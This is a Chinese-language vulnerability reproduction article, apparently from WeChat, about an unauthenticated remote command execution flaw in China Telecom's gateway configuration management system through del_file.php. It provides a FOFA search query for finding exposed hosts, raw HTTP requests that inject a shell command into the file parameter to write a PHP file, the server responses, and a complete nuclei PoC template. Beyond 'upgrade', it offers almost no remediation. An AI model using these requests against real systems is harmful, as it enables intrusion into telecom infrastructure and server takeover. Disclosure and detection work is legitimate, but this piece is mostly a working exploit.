<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/JGiSQAbrfT9Qa_fMva0kAg)

免责申明：**本文内容为学习笔记分享，仅供技术学习参考，请勿用作违法用途，任何个人和组织利用此文所提供的信息而造成的直接或间接后果和损失，均由使用者本人负责，与作者无关！！！**

01

—

漏洞名称

电信网关配置管理系统 del_file.php RCE 漏洞

02

—  

漏洞影响

中国电信网关配置管理系统

03

—  

漏洞描述

电信网关配置管理系统是由中国电信集团有限公司提供的一款专门用于管理和配置电信网络中网关设备的软件。该系统可以帮助网络管理员进行远程监控、配置、升级和故障排除。该系统中的 /manager/newtpl/del_file.php 接口存在一个命令执行漏洞。未经身份验证的远程攻击者可以利用此漏洞执行任意代码，从而导致服务器失陷。

04

—  

FOFA 搜索语句

  

```
body="img/login_bg3.png" && body="系统登录"

```

![图片](https://mmbiz.qpic.cn/mmbiz_png/lloX2SgC3BMOAPHialHQaCcy5wG92pRst8ZztgbUeibqUvqre8xvHYm47OlKy4FDb1yxtElRSql01N28ackQj1jw/640?wx_fmt=png&from=appmsg)

05

—  

漏洞复现

第一步，向靶场写入文件

数据包中 payload 是 url 中的：  
echo%20o8nahpm39boa2gs%20%3E%20abcwavkww.php

转义前明文为：

echo o8nahpm39boa2gs > abcwavkww.php

表示将一个字符串写入到指定文件中，字符串和文件内容随机生成  

```
GET /manager/newtpl/del_file.php?file=1.txt|echo%20o8nahpm39boa2gs%20%3E%20abcwavkww.php HTTP/1.1
Host: x.x.x.x
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
Connection: close

```

响应内容如下表示写入成功

```
HTTP/1.1 200 OK
Connection: close
Content-Type: text/html; charset=UTF-8
Date: Wed, 19 Jun 2024 03:03:52 GMT
Server: Apache/2.2.15 (CentOS)
X-Powered-By: PHP/5.3.3
Content-Length: 0

```

第二步，访问写入的文件

```
GET /manager/newtpl/abcwavkww.php HTTP/1.1
Host: x.x.x.x
User-Agent: Mozilla/5.0 (Macintosh;T2lkQm95X0c= Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Connection: close
Accept-Encoding: gzip

```

响应内容如下，其中包含随机字符串 o8nahpm39boa2gs

```
HTTP/1.1 200 OK
Connection: close
Content-Length: 16
Content-Type: text/html; charset=UTF-8
Date: Wed, 19 Jun 2024 03:03:52 GMT
Server: Apache/2.2.15 (CentOS)
X-Powered-By: PHP/5.3.3
o8nahpm39boa2gs

```

漏洞复现成功

06

—  

nuclei poc

poc 文件内容如下

```
id: china_telecom_gateway_del_file_rce
info:
  name: 电信网关配置管理系统 del_file.php 前台RCE漏洞
  author: fgz
  severity: critical
  description: '电信网关配置管理系统是由中国电信集团有限公司提供的一款专门用于管理和配置电信网络中网关设备的软件。该系统可以帮助网络管理员进行远程监控、配置、升级和故障排除。该系统中的 /manager/newtpl/del_file.php接口存在一个命令执行漏洞。未经身份验证的远程攻击者可以利用此漏洞执行任意代码，从而导致服务器失陷。'
  tags: 2024,rce
  metadata:
    max-request: 1
    fofa-query: body="img/login_bg3.png" && body="系统登录"
    verified: true
variables:
  filename: "\{\{to_lower(rand_base(8))\}\}"
  bodystr: "\{\{to_lower(rand_base(15))\}\}"
http:
  - raw:
      - |-
        GET /manager/newtpl/del_file.php?file=1.txt|echo%20\{\{bodystr\}\}%20%3E%20\{\{filename\}\}.php HTTP/1.1
        Host: \{\{Hostname\}\}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
        Accept-Encoding: gzip, deflate, br
        Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
        Connection: close
      - |
        GET /manager/newtpl/\{\{filename\}\}.php HTTP/1.1
        Host: \{\{Hostname\}\}
        User-Agent: Mozilla/5.0 (Macintosh;T2lkQm95X0c= Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
    matchers:
      - type: dsl
        dsl:
          - "status_code_1 == 200 && status_code_2 == 200 && contains(body_2, '\{\{bodystr\}\}')"

```

07

—  

修复建议

升级到最新版本。

~~~~~~ 感谢您的阅读，祝点赞关注的您财运亨通~~~~~~